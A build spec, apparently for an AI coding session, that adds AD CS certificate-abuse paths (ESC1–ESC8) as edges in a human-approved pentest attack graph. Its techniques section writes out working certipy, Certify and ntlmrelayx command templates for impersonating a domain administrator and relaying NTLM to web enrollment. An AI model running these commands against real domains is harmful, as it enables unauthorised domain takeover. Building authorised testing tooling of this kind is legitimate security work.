# Build spec — AD CS ESC1–8 as graph edges (`:ad` extension)

**Status:** ready to execute in a fresh session. **Author:** planning session, 2026-08-07.
**One line:** make the AD graph **route certificate-services abuse** — ingest `certipy find` output, add `certtemplate` / `certauthority` nodes and **synthesize composite `ESC1…ESC8` abusable edges** from a low-privileged enrollee to a high-value principal, so the same edge-index orchestrator walks "unprivileged user → vulnerable template → Domain Admin." Today certipy is only an arsenal tool + one shadow-cred technique; the graph cannot route the ESC chain.

---

## 0. Guiding constraint (read first, do not weaken)

Adds **NO new gate.** Per-command human approval is the only bound. Keep it **maximally open / offensive**: real certipy against a real CA, real cert-based auth as Domain Admin, real relay to web enrollment — all through **approve-each**. The graph **proposes an edge index, never authors a command** — copy `adgraph/orchestrator.py` exactly (a pick outside the frontier is refused, not repaired; the module executes nothing by AST). No autonomy.

## 1. Read-first (this is a near-clone of how DCSync + shadow-creds already work)

- `backend/adgraph/schema.py` — `NODE_TYPES`, `ABUSABLE_EDGES` (note `AddKeyCredentialLink` already models the ESC-adjacent shadow-cred path), `Node`, `Edge`, `Graph.add_edge`. You add cert node types + ESC edge kinds here.
- `backend/adgraph/parser.py` — **study the `DCSync` synthesis** (`GetChanges` + `GetChangesAll` on the same target ⇒ one composite `DCSync` edge). ESC edges are synthesized the **same way**: a vulnerable template + an enrollee's enroll right ⇒ one composite `ESC{n}` edge. Copy that pattern.
- `backend/adgraph/techniques.py` — `AbuseSpec` (`title/summary/tool/kb_seeds/template/needs_target/destructive/win_template/no_command`) + `technique_for_edge`. Look at the existing `AddKeyCredentialLink` (certipy shadow) entry — the ESC entries mirror it (certipy `req` + `auth`, with a `win_template` using Certify.exe the CRTP way).
- `backend/adgraph/orchestrator.py` — unchanged; BFS routes the new edges once they exist. Set each ESC edge's position in `ABUSABLE_EDGES` for the directness tie-break (ESC1/ESC6/ESC8 are direct → rank them high).
- `backend/adgraph/sample_data.py` — add a **synthetic vulnerable-CA** so `/cockpit/ad` renders an ESC route for the screenshot.
- `backend/arsenal/tools.json` — `certipy` (ESC1–11 described) and `ntlmrelayx` (**ESC8** `--adcs` relay action) are **already present**; add **`Certify.exe`** for the Windows variant. No new Linux tool needed.
- Memory: **attack-step schema lives in 3 files** (a new per-edge field needs `attack_path.py` + `main.py` Pydantic + frontend or `response_model` strips it) — if you add a per-edge prop (e.g. `esc_variant`, `template_name`) make sure it survives serialization. **cockpit/arsenal decoupling.**

## 2. What to build

### 2a. Schema (`adgraph/schema.py`)
Add to `NODE_TYPES`: `"certtemplate"`, `"certauthority"`.
Add to `ABUSABLE_EDGES` (with directness rank; ESC1/6/8 near the top):
- `ESC1` — enrollee → domain/DA : template allows **enrollee-supplied SAN** + a client-auth EKU + low-priv enroll → request a cert as any user (e.g. `administrator`).
- `ESC2` — enrollee → domain : template has **Any Purpose** (or no) EKU → use the cert broadly.
- `ESC3` — enrollee → domain : **Enrollment Agent** template → enroll on behalf of another principal.
- `ESC4` — principal → certtemplate : **write/GenericAll/Owner over a template** → reconfigure it into ESC1, then abuse. (This one targets the template node, then chains to ESC1.)
- `ESC6` — enrollee → domain : CA has **`EDITF_ATTRIBUTESUBJECTALTNAME2`** → *any* template becomes SAN-abusable (ESC1 without a vulnerable template).
- `ESC7` — principal → certauthority : **ManageCA / ManageCertificates** on the CA → approve pending requests / enable SAN flag → escalate.
- `ESC8` — computer → certauthority : **NTLM relay to web enrollment** (`certsrv`) → obtain a cert for the relayed machine/account. (Tool already exists: `ntlmrelayx --adcs`.)
- (Optional, note only) `ESC9`/`ESC10` (no strong SAN mapping / weak cert mapping) and `ESC11` (RPC relay) — model if trivial, otherwise catalog-cite and skip; say so in the PR.

Structural context edges: `PublishedTo` (certtemplate → certauthority), `CanEnroll` (principal → certtemplate, when the template is **not** vulnerable — context, not traversed).

### 2b. Parser (`adgraph/parser.py`)
Ingest **`certipy find -json`** (the authoritative ADCS enum; BloodHound-CE ADCS data is a secondary source). For each template, read: enrollee principals (enroll rights), EKUs, `enrollee_supplies_subject`, manager-approval flag, and per-CA flags (`EDITF_ATTRIBUTESUBJECTALTNAME2`, CA ACL). **Synthesize composite ESC edges** exactly like DCSync: `enrollee-principal --ESC{n}--> domain` (or → a specific DA node) when the (template-vuln × enroll-right) predicate holds. Carry `template_name`, `ca_name`, `esc_variant`, and the EKU in `edge.props`. ESC4/ESC7 target the template/CA node (they're reconfigure-then-abuse), so emit the two-hop shape.

### 2c. Techniques (`adgraph/techniques.py`)
One `AbuseSpec` per ESC, KB-seeded, catalog fallback. Concrete templates (substitute `{source_sam}`, `{domain}`, `{ca}`, `{template}`, `{dc}`):
- **ESC1/ESC6** (Linux): `certipy req -u '{source_sam}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' -template '{template}' -upn 'administrator@{domain}'` → then `certipy auth -pfx administrator.pfx -dc-ip {dc}` (recover the NT hash / TGT). `win_template`: `Certify.exe request /ca:{ca} /template:{template} /altname:administrator`.
- **ESC3**: `certipy req … -template <EnrollmentAgent>` then `certipy req … -on-behalf-of '{domain}\administrator' -pfx agent.pfx`.
- **ESC4**: `certipy template -template '{template}' -write` (reconfigure to be ESC1-vulnerable) then ESC1.
- **ESC7**: `certipy ca -ca '{ca}' -add-officer '{source_sam}'` / `-enable-template SubCA` → issue.
- **ESC8**: `ntlmrelayx.py -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs --template <template>` (already an arsenal action) + a coercion source (printerbug/PetitPotam — see the delegation spec) → `certipy auth` with the yielded cert. Mark `destructive` where it issues a real cert.

### 2d. Enumeration
`certipy find` runs as a **gated job** (or the operator pastes its JSON), parsed → graph — mirror how the cloud enumerate + `:recon` jobs work (`executor.validate_request`, ungated stop). No new gate.

### 2e. Frontend — `/cockpit/ad`
The ESC edges + cert nodes render in the **existing** AD graph. Add node styling for `certtemplate` / `certauthority` and an edge label for `ESC{n}` (`hp-tn-*` classes). **Look at the screen** with the synthetic vulnerable CA loaded.

## 3. Tests
- `backend/test_adcs_graph.py` — parse a `certipy find -json` fixture covering ESC1/ESC4/ESC6/ESC7/ESC8 → correct composite edges + props; routing: a low-priv enrollee reaches DA via ESC1; ESC4/ESC7 produce the two-hop reconfigure-then-abuse shape; each edge has a runnable technique (Linux + where relevant a `win_template`).
- Extend `backend/test_adorch_safety.py` — orchestrator still **picks an index, never authors a command**; a pick outside the frontier is refused; parser/techniques/orchestrator **execute nothing** (AST). Add to `run_safety_tests.sh`.

## 4. Acceptance criteria
- Given `certipy find` output (synthetic for the shot), `/cockpit/ad` shows cert nodes + `ESC{n}` edges; the orchestrator proposes an edge index routing enrollee → DA; approving the certipy command runs it via the executor; `advance` moves only on an approved exit-0 run.
- ESC1, ESC4, ESC6, ESC7, ESC8 all modeled (ESC2/ESC3 too; ESC9–11 optional/cited).
- Cert-abuse steps land as `Finding`s in engagement state.
- `run_safety_tests.sh` green; `next build` exits 0; screen looked at; assessment + README updated (same commit). `Certify.exe` added to arsenal for the Windows path.

## 5. Assumptions (flip any)
- Primary enum source is `certipy find -json`; BloodHound-CE ADCS ingest is optional (add if the parser can take it cheaply).
- ESC1/ESC6/ESC8 are the must-haves (most common, most direct). ESC9–11 may be catalog-cited and deferred — say so in the PR.
- ESC edges synthesized like DCSync (predicate over template-vuln × enroll-right), targeting `domain`/DA; ESC4/ESC7 target the template/CA node.

---

## 6. README + screenshot + assessment (do this exactly like prior sessions)

**Not done until the README + a real screenshot ship with it.** Screen route: **`/cockpit/ad`** (now showing an ESC route).

- **Capture a real lab-state screenshot** with headless Edge (`headless-edge-screenshots`), app running, **synthetic** CA/template data only (no real domain, CA, or account names):
  ```
  EDGE="/c/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"
  "$EDGE" --headless=new --disable-gpu --hide-scrollbars --force-device-scale-factor=1 \
    --user-data-dir=<tmp-profile> --window-size=1440,950 --virtual-time-budget=8000 \
    --screenshot=out.png "http://localhost:3000/cockpit/ad"
  ```
  **View it** — confirm cert nodes + an ESC edge render and the route lights up (not blank/error). Add a deep-link to force the sample if needed (the `?demo=1` / `?session=` pattern).
- **Add the screenshot** to `assets/screenshots/` (next free number); commit it.
- **Add a concise README feature section** (existing voice) + a "What you get, at a glance" row: AD CS ESC1–8 routed in the graph.
- **Update `docs/ASSESSMENT-2026-07-26.md`** + regenerate html/pdf (`python docs/build-assessment.py`) in the **same commit** (`keep-assessment-current`; verify against the html).
- **Look at the screen** (`frontend-class-vocabulary`): `hp-tn-*`, never a bare `hp-card`.
